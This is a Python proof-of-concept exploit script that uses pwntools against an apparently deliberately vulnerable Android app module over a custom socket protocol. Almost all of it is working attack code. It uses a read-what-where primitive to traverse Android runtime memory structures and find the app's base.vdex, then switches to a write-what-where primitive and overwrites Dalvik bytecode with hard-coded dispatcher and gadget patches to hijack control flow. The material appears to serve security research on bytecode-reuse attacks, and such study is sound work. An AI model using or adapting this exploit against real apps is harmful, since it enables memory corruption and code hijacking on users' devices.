#!/usr/bin/env python3

import topper

import traceback
from typing import Tuple
from pwn import *
context.log_level = 'error'
from ropper import RopperService

import json
from pathlib import Path

TIMEOUT = 5

class PwnClient:

    def __init__(self, host : str, port : int):
        self.io = remote(host, port)
        self.handshake()

    def handshake(self) -> None:
        self.send(b'USER', b'INIT', capsule_type=b'INIT')
        self.receive()

    def close(self) -> None:
        self.send(b'', b'SHUTDOWN')
        self.receive()
        self.send(b'', b'', capsule_type=b'ACK')
        self.io.close()

    def send(self, message : bytes, operation, capsule_type=b'CONTENT') -> None:
        capsule = capsule_type + b' ' + operation + b' CONTENT ' + message
        length = len(capsule)
        self.io.send(p32(length, endian='big'))
        self.io.send(capsule)

    def block_receive(self, num_bytes : int) -> bytes:
        message = b''
        while (len(message) < num_bytes):
            received = self.io.recv(1, timeout=TIMEOUT)
            if (received and len(received) > 0):
                message += received
        return message

    """
    Returns:
        (length, capsule_type, operation, content)
    """
    def receive(self) -> Tuple[int, bytes, bytes, bytes]:
        length = u32(self.block_receive(4), endian='big')
        message = self.block_receive(length)
        split_message = message.split(b' ')

        operation = None
        if (len(split_message) >= 2):
            operation = split_message[1]

        content = None
        if (len(split_message) >= 4):
            content = b' '.join(split_message[3:])

        return (length, split_message[0], operation, content)

    def select(self, module_name : str) -> str:
        self.send(module_name.encode('utf-8'), b'SELECT')
        return self.receive()[3].decode()
    
    def forward(self, message : bytes) -> str:
        self.send(message, b'FORWARD')
        return self.receive()[3].decode()

    def fetch(self) -> bytes:
        self.send(b'', b'FETCH')
        return self.receive()[3]
    
    def exit(self) -> str:
        res = ''
        try:
            self.send(b'', b'EXIT')
            res = self.receive()[3].decode()
        except:
            pass
        self.io.close()
        return res

def get_vdex_base(client : PwnClient, base_libart : int, libart : ELF):

    # 1. Find art::Runtime::instance_
    address_instance_ = base_libart + libart.symbols['_ZN3art7Runtime9instance_E']
    instance_ = read_qword(client, address_instance_)

    # 2. Find instance_->oat_file_manager_
    address_oat_file_manager_ = instance_ + 0x570
    oat_file_manager_ = read_qword(client, address_oat_file_manager_)

    # 3. Next read oat_file_manager_->oat_files_ (std::set :^) )
    address_oat_files_ = oat_file_manager_ + 0x8
    oat_files_ = read_qword(client, address_oat_files_)

    # 4. Iterate through tree in order
    # Node: key <=> address, valud <=> file name
    # Kick off with initial root node

    address_root = oat_files_ + 0x0
    root_key = address_root

    print(f'Root: {hex(address_root)}')

    def iterate(client : PwnClient, address : int, current : Node):
        """
        Recursively iterates over a std::set in the remote process
        abusing a read-what-where condition.

        Args:
            client (PwnClient): Remote connection to app.
            address (int): Address of current std::set node.
            current (Node): Node, whose children to read.
        """

        # Load current node. current.left = current.right = None
        # but current.parent is set
        address_oat_file = address + 0x20
        oat_file = read_qword(client, address_oat_file)

        address_file_name = oat_file + 0x18
        probably_file_name = read_qword(client, address_file_name)
        #if ((probably_file_name >> 56) != 0):
            # Inlined string
        #    file_name = read_c_string(client, address_file_name)
        #else:
            # Not inlined
        # Memory tagging is ruining above heuristic...
        file_name = read_c_string(client, probably_file_name)

        current.key = oat_file
        current.value = file_name
        print(f'{current}')

        # Grab left child, if any (interpret first entry as "left")
        address_left_child = address + 0x0
        left_child = read_qword(client, address_left_child)

        if (left_child and left_child != 0):

            # Construct left child node
            left = Node()
            left.parent = current
            current.left = left

            # Continue in left sub-tree
            iterate(client, left_child, left)

        # Grab right child
        address_right_child = address + 0x8
        right_child = read_qword(client, address_right_child)

        if (right_child and right_child != 0):

            # Construct right child node
            right = Node()
            right.parent = current
            current.right = right

            # Continue in left sub-tree
            iterate(client, right_child, right)

    root = Node()
    root.parent = None
    iterate(client, root_key, root)

    def find_node_by_name(root : Node, name : bytes) -> Node:

        if (name in root.value):
            return root

        # Otherwise search subtrees
        result = None
        if (root.left):
            result = find_node_by_name(root.left, name)
        if (not result and root.right):
            result = find_node_by_name(root.right, name)
        return result
    
    base_odex = find_node_by_name(root, b'/base.odex').key
    print(f'base.odex: {hex(base_odex)}')

    # Now grab vdex base from OatFile
    address_base_vdex = base_odex + 0x70
    return read_qword(client, address_base_vdex)

class Node:
    key : int
    value : int

    def __init__(self):
        self.key = 0
        self.value = 0
        self.left = None
        self.right = None
        self.parent = None

    def __str__(self):
        return f'[{hex(self.key)}: {self.value}]'

def read_c_string(client : PwnClient, start_address : int) -> bytes:

    data = b''
    i = 0
    while (not b'\x00' in data):
        client.forward(p64(start_address +  i * 0x8, endian='big'))
        data += p64(u64(client.fetch(), endian='big'))
        i += 1

    return data[:data.find(b'\x00')]

def read_qword(client : PwnClient, address : int) -> int:
    client.forward(p64(address, endian='big'))
    return u64(client.fetch(), endian='big')

def write_bytecode(client : PwnClient, address_bytecode : int, bytecode : bytes):

    # Add nops to bytecode, if its not aligned to 8
    padding = 8 - (len(bytecode) % 8)
    if (padding < 8):
        bytecode += b'\x00' * padding
    
    # Write bytecode
    write_bytes(client, address_bytecode, bytecode)

def write_bytes(client : PwnClient, address : int, data : bytes):
    for i in range(len(data) // 0x8):
        client.forward(p64(address + i * 8, endian='big') + p64(u64(data[i*0x8:(i+1)*0x8], endian='big')))
        print(client.fetch())

def PoCTOP():
    client = PwnClient('127.0.0.1', 8080)
    client.select('PoCMterpModule')

    input("<break>")

    # Leak pointer to module -- IGNORED
    client.fetch()

    # ASSUMPTION: Leak of libart.so
    # E.g. use 'grep -i "libart.so" /proc/$(pidof com.damnvulnerablyapp:VulnerableActivity)/maps'.
    # The app name may differ.
    base_libart = None  # SET THIS

    # /proc/<pid>/maps can also be used to quickly find the path of libart.so.
    # Usually, the path is "/apex/com.android.art/lib64/libart.so". Then use
    # 'adb pull /apex/com.android.art/lib64/libart.so ./libart.so' or so.
    libart = ELF('libart.so')

    # Leak .vdex file by traversing a map
    base_vdex = get_vdex_base(client, base_libart, libart)
    print(f'base.vdex: {hex(base_vdex)}')

    input('<break>')

    # FROM HERE ONWARDS, READ IS REPLACED WITH WRITE WHAT WHERE CONDITION!
    client.forward(b'EXIT')

    # These patches have been identified using Topper. To be precise, the following query was used:
    # '> file -t VDEX -f <path to>/base.vdex'
    # '> attack ctop -m 0x580268 -t 0x29 -g 0x594094, 0x5941b4, 0x594390, 0x5945b4 -v -x 0x100'
    # Gadgets also come from Topper. As these are version - specific (maybe depend on more things),
    # they have to be re-identified for your specific base.vdex file.
    # E.g. in Topper use
    # '> search -l2 -u2 -r "xor.*throw v0$"'
    # to find all gadgets that consist of two instructions (including throw), perform some
    # kind of xor and throw on v0.
    patches = [
        # Dispatcher code including initialization phase and jump table
        (0x5803c0, b'\x22\x00\x29\x00\x12\xf1\xd8\x01\x01\x01\x2b\x01\x03\x00\x00\x00\x00\x01\x04\x00\x00\x00\x00\x00\x65\x9e\x00\x00\xf5\x9e\x00\x00\xe3\x9f\x00\x00\xf5\xa0\x00\x00'),
        # Exception structures
        (0x5803a0, b'\x00\x00\x00\x00\xff\xff\x01\x00\x01\x00\xa7\x01\x90\x00\x00\x00'),
        # Method size patch for padding (-x 0x100)
        (0x580270, b'\x9c\x1a\x00\x00\x94\x00\x00\x00'),
        # Set number of try regions to 1
        (0x580268, b'\x02\x00\x01\x00\x01\x00\x01\x00'),
        # Goto to direct control flow into dispatcher initialization
        (0x580278, b'\x29\x00\xa4\x00\x6e\x10\x70\x00'),
    ]

    for offset, _ in patches:
        print(f'Patching at: {hex(base_vdex + offset)}')

    input('<break>')

    for offset, data in patches:
        write_bytecode(
            client=client,
            address_bytecode=base_vdex + offset,
            bytecode=data
        )

    input('<break>')

    # Get out of write - what - where
    client.forward(b'EXIT')

    # Skip buffer overflow: dont need that
    client.forward(b'')

    # Catch 'bye'
    print(client.fetch())

    # Catch 'bye 2' (used to verify that app did not crash yet)
    print(client.fetch())

    input('Hit <enter> to continue...')

    client.exit()

def main():
    PoCTOP()

if (__name__ == '__main__'):
    main()